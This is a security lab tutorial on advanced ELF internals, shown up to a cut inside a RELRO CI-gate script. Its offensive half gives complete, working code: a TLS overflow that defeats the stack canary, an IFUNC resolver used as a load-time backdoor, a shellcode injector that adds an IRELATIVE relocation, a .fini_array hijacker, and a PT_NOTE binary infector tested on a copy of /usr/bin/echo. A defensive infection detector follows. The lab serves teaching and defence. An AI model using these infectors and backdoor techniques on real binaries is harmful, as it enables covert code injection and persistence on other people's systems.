# Tutorial: ELF Advanced — TLS, IFUNC, Security Segments, Unwinding & Symbol Versioning — Hands-On Lab

> **Companion to:** `domain1_chapter1B_elf_advanced.md`  
> **Scope:** Thread-Local Storage exploitation, IFUNC resolver abuse, `.init_array`/`.fini_array` hijacking, RELRO mechanics, CET (IBT/SHSTK) and hardware CFI, `.eh_frame` unwinding internals, symbol versioning attacks, PT_NOTE infection, binary hardening pipeline construction.  
> **Lab Duration:** 18–24 hours (split across sessions)  
> **Prerequisites:** Complete tutorial_domain1_ch1A_elf_lab.md. Familiarity with pthreads, GDB scripting, and x86_64 calling conventions.

---

## Lab Environment Setup

### Additional Tools (beyond Ch1A setup)

```bash
#!/bin/bash
# lab_setup_ch1B.sh — Additional tools for ELF Advanced Lab

set -euo pipefail

echo "[*] Installing Ch1B-specific dependencies..."
sudo apt install -y \
    libunwind-dev \
    libdwarf-dev \
    dwarfdump \
    libpthread-stubs0-dev \
    gcc-12 \
    linux-headers-$(uname -r)

# CET-capable GCC (check support)
echo "[*] Checking CET support..."
if gcc -fcf-protection -x c -c /dev/null -o /dev/null 2>/dev/null; then
    echo "    [+] CET (-fcf-protection) supported"
else
    echo "    [-] CET not supported on this GCC version"
fi

# Additional Python packages
python3 -m pip install --user \
    construct \
    intervaltree \
    tabulate

mkdir -p ~/elf-lab/ch1B/{tls,ifunc,init-fini,relro,cet,ehframe,versioning,infection}
echo "[+] Ch1B lab directories ready"
```

---

## PART A: OFFENSIVE — Exploiting Advanced ELF Features

### Exercise A1: TLS Buffer Overflow to Corrupt Stack Canary

**Objective:** Demonstrate that Thread-Local Storage variables in the main executable are placed immediately below the Thread Control Block (TCB) on x86_64 Linux, enabling linear overflow from a TLS buffer to corrupt the stack canary stored at `fs:0x28`.

**Concepts tested:** TLS variant-II memory layout, TCB structure, `__stack_chk_guard` location, canary bypass.

#### Step 1: Map the TLS/TCB layout

```c
// tls_layout_probe.c — Visualize TLS memory layout relative to TCB
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#include <string.h>

static __thread char tls_buf_a[32] = "AAAAAAAAAAAAAAAA";
static __thread char tls_buf_b[32];
static __thread int tls_int = 0xDEAD;

static inline uint64_t read_fs_base(void) {
    uint64_t val;
    __asm__ volatile ("movq %%fs:0, %0" : "=r"(val));
    return val;
}

static inline uint64_t read_canary(void) {
    uint64_t val;
    __asm__ volatile ("movq %%fs:0x28, %0" : "=r"(val));
    return val;
}

int main(void) {
    uint64_t fs_base = read_fs_base();
    uint64_t canary = read_canary();
    
    printf("=== TLS Memory Layout Analysis ===\n\n");
    printf("Thread pointer (fs:0):   %p\n", (void*)fs_base);
    printf("Stack canary (fs:0x28):  0x%016lx\n", canary);
    printf("Canary address:          %p\n", (void*)(fs_base + 0x28));
    printf("\n");
    printf("TLS variables:\n");
    printf("  tls_buf_a (%zu bytes): %p  (offset from fs: %ld)\n",
           sizeof(tls_buf_a), tls_buf_a, 
           (long)((uint64_t)tls_buf_a - fs_base));
    printf("  tls_buf_b (%zu bytes): %p  (offset from fs: %ld)\n",
           sizeof(tls_buf_b), tls_buf_b,
           (long)((uint64_t)tls_buf_b - fs_base));
    printf("  tls_int   (%zu bytes): %p  (offset from fs: %ld)\n",
           sizeof(tls_int), &tls_int,
           (long)((uint64_t)&tls_int - fs_base));
    
    printf("\n--- Memory Map (TLS region → TCB) ---\n");
    printf("Lower addresses ← [TLS block] [TCB at fs:0] → Higher addresses\n");
    
    // Calculate distance from last TLS var to canary
    uint64_t highest_tls = (uint64_t)tls_buf_a + sizeof(tls_buf_a);
    uint64_t canary_addr = fs_base + 0x28;
    printf("\nDistance from end of tls_buf_a to canary: %ld bytes\n",
           (long)(canary_addr - highest_tls));
    printf("(An overflow of this many bytes from tls_buf_a reaches the canary)\n");
    
    return 0;
}
```

```bash
cd ~/elf-lab/ch1B/tls
gcc -o tls_layout_probe tls_layout_probe.c -fstack-protector-all -pthread
./tls_layout_probe
```

**Expected output:** Shows TLS variables at negative offsets from `fs:0`, with the canary at `fs:0x28`. The distance calculation reveals exactly how many bytes to overflow.

#### Step 2: Exploit — Overwrite the canary via TLS overflow

```c
// tls_canary_bypass.c — Defeat stack canary via TLS buffer overflow
// Educational/authorized research only.
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

// TLS buffer — lives below TCB in memory (variant II, x86_64)
static __thread char tls_buffer[64];

static inline uint64_t read_canary(void) {
    uint64_t val;
    __asm__ volatile ("movq %%fs:0x28, %0" : "=r"(val));
    return val;
}

static inline void write_canary(uint64_t val) {
    __asm__ volatile ("movq %0, %%fs:0x28" : : "r"(val));
}

// This function has a stack buffer overflow, normally caught by canary
void vulnerable_function(const char *input) {
    char local_buf[32];
    printf("[*] local_buf at: %p\n", local_buf);
    printf("[*] Canary before overflow: 0x%016lx\n", read_canary());
    
    // Overflow local_buf — would normally trigger __stack_chk_fail
    strcpy(local_buf, input);
    
    printf("[*] Canary after overflow:  0x%016lx\n", read_canary());
    printf("[+] Function returned normally — canary check passed!\n");
}

int main(void) {
    printf("=== TLS Canary Bypass Demonstration ===\n\n");
    
    uint64_t original_canary = read_canary();
    printf("[*] Original canary: 0x%016lx\n", original_canary);
    printf("[*] tls_buffer at:   %p\n", tls_buffer);
    
    // Step 1: Calculate overflow distance from tls_buffer to canary
    uint64_t fs_base;
    __asm__ volatile ("movq %%fs:0, %0" : "=r"(fs_base));
    long distance = (long)((fs_base + 0x28) - (uint64_t)tls_buffer);
    printf("[*] Distance from tls_buffer to canary: %ld bytes\n", distance);
    
    if (distance < 0 || distance > 4096) {
        printf("[-] Unexpected layout — aborting\n");
        return 1;
    }
    
    // Step 2: Overflow tls_buffer to overwrite the canary with known value
    uint64_t fake_canary = 0x4141414141414141ULL;
    memset(tls_buffer, 'B', distance);
    memcpy(tls_buffer + distance, &fake_canary, 8);
    
    printf("[*] Canary overwritten to: 0x%016lx\n", read_canary());
    printf("[*] We now know the canary value!\n\n");
    
    // Step 3: Craft overflow for vulnerable_function that includes our known canary
    // The stack frame layout: [local_buf(32)] [canary(8)] [saved_rbp(8)] [ret_addr(8)]
    char exploit_buf[128];
    memset(exploit_buf, 'A', 32);                          // Fill local_buf
    memcpy(exploit_buf + 32, &fake_canary, 8);             // Match our planted canary
    memset(exploit_buf + 40, 'C', 8);                      // Overwrite saved RBP
    // In a real exploit, bytes 48-55 would be the target return address
    // For demo, we just prove the canary check passes
    exploit_buf[48] = '\0';  // Terminate string
    
    printf("[*] Calling vulnerable_function with crafted input...\n");
    vulnerable_function(exploit_buf);
    printf("[+] SUCCESS: Stack canary bypassed via TLS corruption!\n");
    
    return 0;
}
```

```bash
gcc -o tls_canary_bypass tls_canary_bypass.c -fstack-protector-all -no-pie -pthread
./tls_canary_bypass
```

**Expected output:** The stack canary check passes despite the buffer overflow in `vulnerable_function`, because we pre-corrupted the canary in the TCB to a known value and then included that value in our overflow payload.

**Security lesson:** TLS placement adjacent to the TCB creates a class of vulnerabilities where heap or TLS corruptions can defeat stack canaries. Mitigations include: address space randomization making the offset unpredictable (partial), shadow stacks (hardware CET), and compiler-based separation of TLS from security-critical TCB fields.

---

### Exercise A2: IFUNC Resolver Abuse

**Objective:** Demonstrate that `STT_GNU_IFUNC` resolvers execute at load time with the privileges of the dynamic linker, making them an attractive target for code execution during the loading phase.

**Concepts tested:** `R_X86_64_IRELATIVE`, resolver execution timing, `.rela.dyn` IRELATIVE entries.

#### Step 1: Create a legitimate IFUNC

```c
// ifunc_demo.c — Legitimate IFUNC usage (CPU feature dispatch)
#include <stdio.h>
#include <string.h>
#include <cpuid.h>

// Fast path — uses SSE4.2 CRC32 instruction
static size_t strlen_fast(const char *s) {
    // Simplified — real implementation would use SIMD
    printf("  [strlen_fast] Using optimized path\n");
    return __builtin_strlen(s);
}

// Slow path — generic implementation
static size_t strlen_slow(const char *s) {
    printf("  [strlen_slow] Using generic path\n");
    const char *p = s;
    while (*p) p++;
    return p - s;
}

// IFUNC resolver — executes during dynamic linking to select implementation
static size_t (*resolve_my_strlen(void))(const char *) {
    unsigned int eax, ebx, ecx, edx;
    __cpuid(1, eax, ebx, ecx, edx);
    
    printf("  [IFUNC resolver] Running at load time! ECX=0x%x\n", ecx);
    
    if (ecx & (1 << 20)) {  // SSE4.2
        printf("  [IFUNC resolver] Selected fast path (SSE4.2 available)\n");
        return strlen_fast;
    } else {
        printf("  [IFUNC resolver] Selected slow path\n");
        return strlen_slow;
    }
}

// Declare the IFUNC
size_t my_strlen(const char *s) __attribute__((ifunc("resolve_my_strlen")));

int main(void) {
    printf("\n[*] main() starting — resolver already ran during load\n");
    printf("[*] Calling my_strlen(\"hello\"):\n");
    size_t len = my_strlen("hello");
    printf("[*] Result: %zu\n", len);
    return 0;
}
```

```bash
gcc -o ifunc_demo ifunc_demo.c -no-pie
./ifunc_demo
# Note: resolver output appears BEFORE main() output
```

#### Step 2: IFUNC resolver as backdoor injection point

```c
// ifunc_backdoor.c — Demonstrates IFUNC resolver executing arbitrary code at load time
// In a real attack, the resolver could be injected by patching .rela.dyn IRELATIVE entries
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

// Malicious resolver — executes before main()
static int (*resolve_backdoor(void))(void) {
    // This code runs during dynamic linking, before main()
    // No sanitizers, no hooks, no LD_AUDIT callbacks have fully initialized
    
    FILE *f = fopen("/tmp/.ifunc_backdoor_proof", "w");
    if (f) {
        fprintf(f, "IFUNC resolver executed at load time\n");
        fprintf(f, "PID: %d, UID: %d, EUID: %d\n", getpid(), getuid(), geteuid());
        fprintf(f, "This ran BEFORE main() and before most library constructors\n");
        fclose(f);
    }
    
    // Return a benign function pointer to avoid suspicion
    return NULL;  // Will segfault if actually called — for demo only
}

int backdoor_func(void) __attribute__((ifunc("resolve_backdoor")));

// Normal-looking main
int main(void) {
    printf("[*] Program running normally\n");
    printf("[*] Check /tmp/.ifunc_backdoor_proof\n");
    
    // The backdoor already executed during load
    // An attacker would make the resolver do something stealthy
    // and return a valid function pointer to avoid detection
    
    return 0;
}
```

```bash
gcc -o ifunc_backdoor ifunc_backdoor.c -no-pie
./ifunc_backdoor
cat /tmp/.ifunc_backdoor_proof
```

#### Step 3: Binary patching — inject IRELATIVE relocation

```python
#!/usr/bin/env python3
"""
inject_irelative.py — Patch a binary to add a fake IRELATIVE relocation
that calls attacker-controlled code during dynamic linking.

This simulates what a supply-chain attacker or binary patcher would do:
1. Find space for shellcode (in padding or a new segment)
2. Add an R_X86_64_IRELATIVE entry to .rela.dyn
3. Point it at the shellcode
4. The dynamic linker will CALL the shellcode as a "resolver" during load

WARNING: Authorized research/CTF use only.
"""
import lief
import sys

def inject_irelative(input_path, output_path):
    binary = lief.parse(input_path)
    
    # Find a code cave or use .note section for our "resolver"
    # For demonstration, we'll add a small shellcode that writes a marker file
    # Real shellcode would be position-independent; here we use a simple approach
    
    # Our "resolver" shellcode (x86_64, position-independent)
    # Equivalent to: write(1, "PWNED\n", 6); return <original_entry>;
    shellcode = bytes([
        # mov rax, 1 (sys_write)
        0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,
        # mov rdi, 1 (stdout)
        0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,
        # lea rsi, [rip+msg]
        0x48, 0x8d, 0x35, 0x15, 0x00, 0x00, 0x00,
        # mov rdx, 6
        0x48, 0xc7, 0xc2, 0x06, 0x00, 0x00, 0x00,
        # syscall
        0x0f, 0x05,
        # mov rax, <entry_point> — return value (the "resolved" address)
        0x48, 0xb8,
    ])
    
    entry = binary.entrypoint
    shellcode += entry.to_bytes(8, 'little')
    
    # ret
    shellcode += bytes([0xc3])
    
    # "PWNED\n" string
    shellcode += b"PWNED\n"
    
    # Add shellcode to a new segment
    segment = lief.ELF.Segment()
    segment.type = lief.ELF.SEGMENT_TYPES.LOAD
    segment.flags = (lief.ELF.SEGMENT_FLAGS.R | 
                     lief.ELF.SEGMENT_FLAGS.X)
    segment.content = list(shellcode)
    segment.alignment = 0x1000
    
    new_seg = binary.add(segment)
    shellcode_addr = new_seg.virtual_address
    
    print(f"[*] Shellcode injected at: 0x{shellcode_addr:x}")
    
    # Add IRELATIVE relocation pointing to our shellcode
    # The dynamic linker will CALL shellcode_addr and write the return value
    # to the relocation's r_offset
    
    # We need a writable address for r_offset (where result gets stored)
    # Use .bss or end of data segment
    bss = binary.get_section(".bss")
    if bss:
        target_addr = bss.virtual_address + bss.size - 8
    else:
        # Fallback: use end of last writable segment
        for seg in binary.segments:
            if seg.type == lief.ELF.SEGMENT_TYPES.LOAD and \
               seg.flags & lief.ELF.SEGMENT_FLAGS.W:
                target_addr = seg.virtual_address + seg.virtual_size - 8
    
    print(f"[*] IRELATIVE target address: 0x{target_addr:x}")
    
    # Create the relocation
    reloc = lief.ELF.Relocation(
        target_addr,
        lief.ELF.RELOCATION_X86_64.IRELATIVE,
        shellcode_addr,  # addend = resolver address
        False  # is_rela = true (implicit for x86_64)
    )
    
    binary.add_dynamic_relocation(reloc)
    
    print(f"[+] Added R_X86_64_IRELATIVE: offset=0x{target_addr:x}, "
          f"resolver=0x{shellcode_addr:x}")
    
    binary.write(output_path)
    print(f"[+] Written to: {output_path}")
    print(f"[+] The 'PWNED' message will print during dynamic linking, before main()")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <input_binary> <output_binary>")
        sys.exit(1)
    inject_irelative(sys.argv[1], sys.argv[2])
```

```bash
cd ~/elf-lab/ch1B/ifunc
# Use a simple target
cp ../../../samples/hello_pie ./target
python3 inject_irelative.py target target_infected
chmod +x target_infected
./target_infected
# "PWNED" appears before normal output
```

---

### Exercise A3: .fini_array Hijacking for Persistent Code Execution

**Objective:** Demonstrate modification of `.fini_array` entries to execute arbitrary code when a program exits, creating a post-exploitation persistence mechanism within the binary itself.

**Concepts tested:** `.fini_array`/`.init_array` structure, destructor ordering, GOT-relative addressing, binary patching.

#### Step 1: Understand init/fini ordering

```c
// init_fini_order.c — Demonstrates constructor/destructor execution order
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor(101))) void ctor_early(void) {
    printf("[CTOR priority=101] Early constructor\n");
}

__attribute__((constructor(200))) void ctor_late(void) {
    printf("[CTOR priority=200] Late constructor\n");
}

__attribute__((constructor)) void ctor_default(void) {
    printf("[CTOR default] Default priority constructor\n");
}

__attribute__((destructor(101))) void dtor_early(void) {
    printf("[DTOR priority=101] Early destructor\n");
}

__attribute__((destructor(200))) void dtor_late(void) {
    printf("[DTOR priority=200] Late destructor\n");
}

__attribute__((destructor)) void dtor_default(void) {
    printf("[DTOR default] Default priority destructor\n");
}

void atexit_handler(void) {
    printf("[ATEXIT] atexit handler\n");
}

int main(void) {
    atexit(atexit_handler);
    printf("[MAIN] main() executing\n");
    return 0;
}
```

```bash
cd ~/elf-lab/ch1B/init-fini
gcc -o init_fini_order init_fini_order.c -no-pie
./init_fini_order

# Examine the arrays
readelf -x .init_array init_fini_order
readelf -x .fini_array init_fini_order
objdump -d -j .init_array init_fini_order
nm init_fini_order | grep -E "ctor|dtor"
```

**Expected output:** Constructors run before `main()` (lowest priority number first), destructors run after `main()` returns (highest priority number first), and `atexit` handlers run between destructors.

#### Step 2: Patch .fini_array to inject code execution on exit

```python
#!/usr/bin/env python3
"""
fini_array_hijack.py — Patch .fini_array to execute shellcode on program exit.
The dynamic linker calls fini_array entries in REVERSE order when the program exits.
We prepend our shellcode address so it runs LAST (after all legitimate destructors).
"""
import lief
import struct
import sys

def hijack_fini_array(input_path, output_path):
    binary = lief.parse(input_path)
    
    # Find .fini_array section
    fini_array = binary.get_section(".fini_array")
    if fini_array is None:
        print("[-] No .fini_array found")
        return
    
    print(f"[*] .fini_array at: 0x{fini_array.virtual_address:x}")
    print(f"[*] .fini_array size: {fini_array.size} bytes")
    print(f"[*] Entries: {fini_array.size // 8}")
    
    # Parse existing entries
    content = bytes(fini_array.content)
    entries = []
    for i in range(0, len(content), 8):
        addr = struct.unpack_from('<Q', content, i)[0]
        entries.append(addr)
        print(f"    [{i//8}] 0x{addr:x}")
    
    # Create our payload — a function that demonstrates execution
    # In this case: write a file to prove we ran, then return cleanly
    # Position-independent shellcode
    payload_asm = bytes([
        # push registers we'll use
        0x50,                                           # push rax
        0x57,                                           # push rdi
        0x56,                                           # push rsi
        0x52,                                           # push rdx
        # write(1, "EXIT_HOOK\n", 10)
        0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,     # mov rax, 1
        0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,     # mov rdi, 1
        0x48, 0x8d, 0x35, 0x12, 0x00, 0x00, 0x00,     # lea rsi, [rip+msg]
        0x48, 0xc7, 0xc2, 0x0a, 0x00, 0x00, 0x00,     # mov rdx, 10
        0x0f, 0x05,                                     # syscall
        # pop registers and return
        0x5a,                                           # pop rdx
        0x5e,                                           # pop rsi
        0x5f,                                           # pop rdi
        0x58,                                           # pop rax
        0xc3,                                           # ret
        # msg:
    ]) + b"EXIT_HOOK\n"
    
    # Add payload as a new loadable segment
    segment = lief.ELF.Segment()
    segment.type = lief.ELF.SEGMENT_TYPES.LOAD
    segment.flags = lief.ELF.SEGMENT_FLAGS.R | lief.ELF.SEGMENT_FLAGS.X
    segment.content = list(payload_asm)
    segment.alignment = 0x1000
    
    new_seg = binary.add(segment)
    payload_addr = new_seg.virtual_address
    print(f"\n[*] Payload injected at: 0x{payload_addr:x}")
    
    # Add our address to .fini_array
    # Destructors run in REVERSE order, so adding at the END means we run FIRST
    # Adding at the BEGINNING means we run LAST
    entries.insert(0, payload_addr)  # Run last (after legitimate dtors)
    
    # Rebuild .fini_array content
    new_content = b''.join(struct.pack('<Q', addr) for addr in entries)
    
    # Resize and update the section
    fini_array.content = list(new_content)
    fini_array.size = len(new_content)
    
    print(f"[*] New .fini_array ({len(entries)} entries):")
    for i, addr in enumerate(entries):
        marker = " ← INJECTED" if addr == payload_addr else ""
        print(f"    [{i}] 0x{addr:x}{marker}")
    
    binary.write(output_path)
    print(f"\n[+] Written: {output_path}")
    print("[+] 'EXIT_HOOK' will print when program exits normally")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <input> <output>")
        sys.exit(1)
    hijack_fini_array(sys.argv[1], sys.argv[2])
```

```bash
cp init_fini_order ./target_fini
python3 fini_array_hijack.py target_fini target_fini_hijacked
chmod +x target_fini_hijacked
./target_fini_hijacked
# "EXIT_HOOK" appears during program shutdown
```

---

### Exercise A4: PT_NOTE Segment Infection

**Objective:** Replace the PT_NOTE segment (used for build-ID and ABI tags) with a PT_LOAD segment containing shellcode, achieving code injection without changing the file size significantly.

**Concepts tested:** PT_NOTE as expendable metadata, segment type modification, program header patching, entry point redirection.

```python
#!/usr/bin/env python3
"""
ptnote_infect.py — Classic ELF infection via PT_NOTE→PT_LOAD conversion.

Technique:
1. Find PT_NOTE segment (contains .note.* sections — non-essential for execution)
2. Change its type to PT_LOAD with RX permissions
3. Write shellcode into the note segment's file region
4. Redirect entry point to shellcode
5. Shellcode jumps to original entry point after executing payload

This is a well-known technique used by ELF viruses (Linux.Midrashim, etc.)
and implant frameworks. The binary remains functional.
"""
import struct
import sys
import os

def infect_ptnote(input_path, output_path):
    with open(input_path, 'rb') as f:
        data = bytearray(f.read())
    
    # Parse ELF header
    if data[:4] != b'\x7fELF':
        print("[-] Not an ELF file")
        return
    
    is_64 = data[4] == 2
    if not is_64:
        print("[-] Only 64-bit supported in this demo")
        return
    
    e_entry = struct.unpack_from('<Q', data, 24)[0]
    e_phoff = struct.unpack_from('<Q', data, 32)[0]
    e_phnum = struct.unpack_from('<H', data, 56)[0]
    e_phentsize = struct.unpack_from('<H', data, 54)[0]
    
    print(f"[*] Original entry point: 0x{e_entry:x}")
    print(f"[*] Program headers: {e_phnum} at offset 0x{e_phoff:x}")
    
    # Find PT_NOTE segment
    note_idx = None
    note_offset = 0
    note_size = 0
    note_vaddr = 0
    
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        p_type = struct.unpack_from('<I', data, off)[0]
        
        if p_type == 4:  # PT_NOTE
            note_idx = i
            note_offset = struct.unpack_from('<Q', data, off + 8)[0]
            note_vaddr = struct.unpack_from('<Q', data, off + 16)[0]
            note_size = struct.unpack_from('<Q', data, off + 32)[0]
            print(f"[*] Found PT_NOTE at index {i}:")
            print(f"    File offset: 0x{note_offset:x}")
            print(f"    Virtual addr: 0x{note_vaddr:x}")
            print(f"    Size: {note_size} bytes")
            break
    
    if note_idx is None:
        print("[-] No PT_NOTE segment found")
        return
    
    # Build shellcode that:
    # 1. Executes payload (write "INFECTED\n" to stdout)
    # 2. Jumps to original entry point
    
    # Position-independent shellcode
    payload = bytearray([
        # Save all registers (clean execution)
        0x50,                                       # push rax
        0x53,                                       # push rbx
        0x51,                                       # push rcx
        0x52,                                       # push rdx
        0x56,                                       # push rsi
        0x57,                                       # push rdi
        # write(1, msg, 9)
        0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, # mov rax, 1 (sys_write)
        0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00, # mov rdi, 1 (stdout)
        0x48, 0x8d, 0x35, 0x21, 0x00, 0x00, 0x00, # lea rsi, [rip + msg]
        0x48, 0xc7, 0xc2, 0x09, 0x00, 0x00, 0x00, # mov rdx, 9
        0x0f, 0x05,                                 # syscall
        # Restore registers
        0x5f,                                       # pop rdi
        0x5e,                                       # pop rsi
        0x5a,                                       # pop rdx
        0x59,                                       # pop rcx
        0x5b,                                       # pop rbx
        0x58,                                       # pop rax
        # Jump to original entry point (absolute)
        0x48, 0xb8,                                 # mov rax, <imm64>
    ])
    payload += struct.pack('<Q', e_entry)            # original entry address
    payload += bytearray([
        0xff, 0xe0,                                 # jmp rax
    ])
    # msg:
    payload += b"INFECTED\n"
    
    if len(payload) > note_size:
        print(f"[-] Payload ({len(payload)} bytes) exceeds PT_NOTE ({note_size} bytes)")
        return
    
    print(f"[*] Payload size: {len(payload)} bytes (fits in {note_size}-byte note segment)")
    
    # Write shellcode into the note segment's file region
    data[note_offset:note_offset + len(payload)] = payload
    # Zero-fill remainder
    for i in range(len(payload), note_size):
        data[note_offset + i] = 0
    
    # Patch the program header: PT_NOTE → PT_LOAD with RX
    phdr_off = e_phoff + note_idx * e_phentsize
    struct.pack_into('<I', data, phdr_off, 1)       # p_type = PT_LOAD
    struct.pack_into('<I', data, phdr_off + 4, 5)   # p_flags = PF_R | PF_X
    # Keep p_offset, p_vaddr, p_filesz, p_memsz as-is
    # Set p_align to page size
    struct.pack_into('<Q', data, phdr_off + 48, 0x1000)  # p_align
    
    # Redirect entry point to our shellcode
    new_entry = note_vaddr  # Virtual address where shellcode now lives
    struct.pack_into('<Q', data, 24, new_entry)
    
    print(f"[+] Entry point redirected: 0x{e_entry:x} → 0x{new_entry:x}")
    print(f"[+] PT_NOTE[{note_idx}] converted to PT_LOAD (RX)")
    
    with open(output_path, 'wb') as f:
        f.write(data)
    os.chmod(output_path, 0o755)
    
    print(f"[+] Written: {output_path}")
    print(f"[+] Binary will print 'INFECTED' then execute normally")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <input_elf> <output_elf>")
        sys.exit(1)
    infect_ptnote(sys.argv[1], sys.argv[2])
```

```bash
cd ~/elf-lab/ch1B/infection
cp /usr/bin/echo ./echo_target
python3 ptnote_infect.py echo_target echo_infected
./echo_infected "Hello, this should work normally"
# Output: "INFECTED" followed by "Hello, this should work normally"
```

---

## PART B: DEFENSIVE — Detection and Hardening

### Exercise B1: Detecting PT_NOTE Infection

**Objective:** Build a detector that identifies PT_NOTE→PT_LOAD conversions and other segment-type anomalies indicating binary infection.

```python
#!/usr/bin/env python3
"""
segment_infection_detector.py — Detect ELF segment infection techniques
Checks for:
1. PT_NOTE segments that are executable (converted to PT_LOAD)
2. Missing PT_NOTE in binaries that should have one
3. PT_LOAD segments in unusual address ranges
4. Entry point not in the first executable PT_LOAD
5. Multiple executable PT_LOAD segments (possible infection)
"""
import struct
import sys
import os
from pathlib import Path

class SegmentInfectionDetector:
    def __init__(self, path):
        self.path = path
        with open(path, 'rb') as f:
            self.data = f.read()
        self.findings = []
    
    def analyze(self):
        if self.data[:4] != b'\x7fELF' or self.data[4] != 2:
            return self.findings
        
        e_entry = struct.unpack_from('<Q', self.data, 24)[0]
        e_phoff = struct.unpack_from('<Q', self.data, 32)[0]
        e_phnum = struct.unpack_from('<H', self.data, 56)[0]
        e_phentsize = struct.unpack_from('<H', self.data, 54)[0]
        
        segments = []
        has_note = False
        exec_loads = []
        
        for i in range(e_phnum):
            off = e_phoff + i * e_phentsize
            if off + 56 > len(self.data):
                break
            
            p_type = struct.unpack_from('<I', self.data, off)[0]
            p_flags = struct.unpack_from('<I', self.data, off + 4)[0]
            p_offset = struct.unpack_from('<Q', self.data, off + 8)[0]
            p_vaddr = struct.unpack_from('<Q', self.data, off + 16)[0]
            p_filesz = struct.unpack_from('<Q', self.data, off + 32)[0]
            p_memsz = struct.unpack_from('<Q', self.data, off + 40)[0]
            
            segments.append({
                'idx': i, 'type': p_type, 'flags': p_flags,
                'offset': p_offset, 'vaddr': p_vaddr,
                'filesz': p_filesz, 'memsz': p_memsz
            })
            
            if p_type == 4:  # PT_NOTE
                has_note = True
                # Check if PT_NOTE has executable permissions (ANOMALY)
                if p_flags & 0x1:
                    self.findings.append(
                        f"CRITICAL: PT_NOTE segment [{i}] has EXECUTE permission! "
                        f"Likely PT_NOTE→PT_LOAD infection.")
            
            if p_type == 1 and (p_flags & 0x1):  # PT_LOAD + PF_X
                exec_loads.append({
                    'idx': i, 'vaddr': p_vaddr, 'size': p_memsz
                })
        
        # Check 1: No PT_NOTE in a dynamically linked binary
        has_interp = any(s['type'] == 3 for s in segments)
        if has_interp and not has_note:
            self.findings.append(
                "HIGH: Dynamic binary has no PT_NOTE segment "
                "(may have been converted for infection)")
        
        # Check 2: Entry point analysis
        if exec_loads:
            # Sort executable segments by address
            exec_loads.sort(key=lambda s: s['vaddr'])
            
            # Entry should be in the FIRST (main) executable segment
            first_exec = exec_loads[0]
            entry_in_first = (e_entry >= first_exec['vaddr'] and 
                            e_entry < first_exec['vaddr'] + first_exec['size'])
            
            if not entry_in_first and len(exec_loads) > 1:
                # Entry is in a different exec segment — suspicious
                for seg in exec_loads[1:]:
                    if e_entry >= seg['vaddr'] and e_entry < seg['vaddr'] + seg['size']:
                        self.findings.append(
                            f"HIGH: Entry point 0x{e_entry:x} is in secondary executable "
                            f"segment [{seg['idx']}] (vaddr=0x{seg['vaddr']:x}), "
                            f"not the primary text segment. Possible infection redirect.")
                        break
            
            # Check 3: More than 2 executable PT_LOAD segments is unusual
            if len(exec_loads) > 2:
                self.findings.append(
                    f"MEDIUM: {len(exec_loads)} executable PT_LOAD segments "
                    f"(typical binaries have 1-2). May indicate segment injection.")
        
        # Check 4: Look for executable content in what should be the note region
        for seg in segments:
            if seg['type'] == 4:  # PT_NOTE
                # Read the note content — should start with a valid note header
                note_off = seg['offset']
                if note_off + 12 <= len(self.data):
                    namesz = struct.unpack_from('<I', self.data, note_off)[0]
                    descsz = struct.unpack_from('<I', self.data, note_off + 4)[0]
                    note_type = struct.unpack_from('<I', self.data, note_off + 8)[0]
                    
                    # Valid notes have reasonable sizes
                    if namesz > 256 or descsz > 4096:
                        self.findings.append(
                            f"MEDIUM: PT_NOTE [{seg['idx']}] has unusual "
                            f"note header (namesz={namesz}, descsz={descsz}). "
                            f"May contain non-note data.")
        
        return self.findings


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <binary_or_directory>")
        sys.exit(1)
    
    target = sys.argv[1]
    
    if os.path.isdir(target):
        for fpath in Path(target).rglob('*'):
            if fpath.is_file():
                try:
                    with open(fpath, 'rb') as f:
                        if f.read(4) == b'\x7fELF':
                            det = SegmentInfectionDetector(str(fpath))
                            findings = det.analyze()
                            if findings:
                                print(f"\n[!] {fpath}:")
                                for f in findings:
                                    print(f"    {f}")
                except (IOError, PermissionError):
                    continue
    else:
        det = SegmentInfectionDetector(target)
        findings = det.analyze()
        if findings:
            print(f"[!] Findings for {target}:")
            for f in findings:
                print(f"  {f}")
        else:
            print(f"[+] {target}: No infection indicators detected")


if __name__ == '__main__':
    main()
```

```bash
# Test against our infected binary
python3 segment_infection_detector.py echo_infected
# Should detect the infection

# Test against clean binaries
python3 segment_infection_detector.py /usr/bin/ls
python3 segment_infection_detector.py /usr/bin/
```

---

### Exercise B2: Full RELRO Enforcement and Verification

**Objective:** Build a CI/CD gate that ensures all compiled binaries have full RELRO, rejecting builds that don't meet the hardening threshold.

```bash
#!/bin/bash
# relro_gate.sh — CI/CD security gate for RELRO enforcement
# Returns non-zero exit code if any binary fails the check
# Integrates with: GitHub Actions, GitLab CI, Jenkins

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
FAIL_COUNT=0
PASS_COUNT=0
WARN_COUNT=0

check_relro() {
    local binary="$1"
    local strict="${2:-true}"
    
    # Skip non-ELF files
    if ! file "$binary" | grep -q "ELF"; then
        return 0
    fi
    
    local has_relro=$(readelf -l "$binary" 2>/dev/null | grep -c "GNU_RELRO" || true)
    local has_bindnow=$(readelf -d "$binary" 2>/dev/null | grep -c "BIND_NOW" || true)
    
    if [ "$has_relro" -gt 0 ] && [ "$has_bindnow" -gt 0 ]; then
        echo "  [PASS] $binary — Full RELRO"
        PASS_COUNT=$((PASS_COUNT + 1))
        return 0
    elif [ "$has_relro" -gt 0 ]; then
        if [ "$strict" = "true" ]; then
            echo "  [FAIL] $binary — Partial RELRO only (need -Wl,-z,now)"
